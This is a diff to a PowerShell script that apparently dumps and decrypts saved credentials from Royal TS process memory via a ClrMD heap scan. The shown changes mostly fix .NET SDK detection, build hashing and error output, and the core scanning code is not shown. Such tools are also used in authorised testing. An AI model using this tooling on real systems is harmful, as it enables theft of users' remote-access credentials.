@@ -181,6 +181,27 @@ $banner = @"
 
 Write-Host $banner -ForegroundColor Cyan
 
+# ─── Detect .NET SDK (needed for dump/offline) ───
+$dotnetTfm = $null
+if ($Mode -in 'dump','offline') {
+    try {
+        $sdkList = & dotnet --list-sdks 2>$null
+        if ($sdkList) {
+            foreach ($line in $sdkList) {
+                if ($line -match '^(\d+)\.') {
+                    $major = [int]$Matches[1]
+                    $candidate = "net$major.0"
+                    if (-not $dotnetTfm -or $major -gt [int]($dotnetTfm -replace 'net|\.0','')) { $dotnetTfm = $candidate }
+                }
+            }
+        }
+    } catch {}
+    if (-not $dotnetTfm) {
+        Write-Error "[-] .NET SDK not found. Install from https://dotnet.microsoft.com/download"
+        exit 1
+    }
+    Write-Host "[*] .NET SDK: $dotnetTfm" -ForegroundColor DarkGray
+}
 
 # ═══════════════════════════════════════════
 #  MODE: RECON
@@ -762,25 +783,17 @@ class Program
     }
 }
 '@
-    $csHash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($csCode))).Replace('-','')
+    # Build hash includes both C# code AND target framework to force rebuild on SDK change
+    $fullHash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash(
+        [System.Text.Encoding]::UTF8.GetBytes($csCode + $dotnetTfm)
+    )).Replace('-','')
     $oldHash = if (Test-Path $hashFile) { (Get-Content $hashFile -Raw).Trim() } else { '' }
-    $needsSetup = (-not (Test-Path $csprojPath)) -or ($csHash -ne $oldHash)
+    $needsSetup = (-not (Test-Path $csprojPath)) -or ($fullHash -ne $oldHash)
     if ($needsSetup) {
         Write-Host "[*] Setting up ClrMD project..." -ForegroundColor Cyan
         New-Item -ItemType Directory -Force -Path $projectDir | Out-Null
         Remove-Item (Join-Path $projectDir "bin") -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item (Join-Path $projectDir "obj") -Recurse -Force -ErrorAction SilentlyContinue
-        # Auto-detect best .NET SDK available
-        $dotnetTfm = "net8.0"
-        try {
-            $sdkList = dotnet --list-sdks 2>$null
-            if ($sdkList -match '10\.') { $dotnetTfm = "net10.0" }
-            elseif ($sdkList -match '9\.') { $dotnetTfm = "net9.0" }
-            elseif ($sdkList -match '8\.') { $dotnetTfm = "net8.0" }
-            elseif ($sdkList -match '7\.') { $dotnetTfm = "net7.0" }
-            elseif ($sdkList -match '6\.') { $dotnetTfm = "net6.0" }
-        } catch {}
-        Write-Host "[*] Using .NET target: $dotnetTfm" -ForegroundColor DarkGray
         @"
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
@@ -796,9 +809,14 @@ class Program
         $csCode | Set-Content (Join-Path $projectDir "Program.cs") -Encoding utf8
         Write-Host "[*] Restoring NuGet packages..." -ForegroundColor Cyan
         Push-Location $projectDir
-        dotnet restore --verbosity quiet 2>&1 | Out-Null
+        $restoreOut = dotnet restore --verbosity quiet 2>&1
         Pop-Location
-        $csHash | Set-Content $hashFile -NoNewline
+        if ($LASTEXITCODE -ne 0) {
+            Write-Host "[!] NuGet restore failed:" -ForegroundColor Red
+            $restoreOut | ForEach-Object { Write-Host "    $_" -ForegroundColor Red }
+            exit 1
+        }
+        $fullHash | Set-Content $hashFile -NoNewline
     }
 
     # Detect Royal TS install dir for SecurityInterface decryption
@@ -818,9 +836,18 @@ class Program
         ) | Where-Object { Test-Path "$_\RoyalDocument.SecurityInterface.dll" } | Select-Object -First 1
     }
     if (-not $rtInstallDir) { $rtInstallDir = "." }
+    Write-Host "[*] Royal TS dir: $rtInstallDir" -ForegroundColor DarkGray
 
     Write-Host "[*] Running ClrMD heap scan + decrypt..." -ForegroundColor Cyan
     $output = dotnet run --project $projectDir -c Release -- $proc.Id "`"$rtInstallDir`"" 2>&1
+
+    # Show ALL output for debugging if no results found
+    $hasResults = $false
+    foreach ($line in $output) { if ("$line" -eq '##RESULTS_START##') { $hasResults = $true; break } }
+    if (-not $hasResults) {
+        Write-Host "[!] Scanner produced no results. Full output:" -ForegroundColor Red
+        foreach ($line in $output) { Write-Host "    $line" -ForegroundColor DarkYellow }
+    }
 
     $inResults = $false
     $credentials = @()
@@ -1130,7 +1157,7 @@ if ($Mode -eq 'offline') {
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
     <OutputType>Exe</OutputType>
-    <TargetFramework>net8.0</TargetFramework>
+    <TargetFramework>$dotnetTfm</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
   </PropertyGroup>
   <ItemGroup>
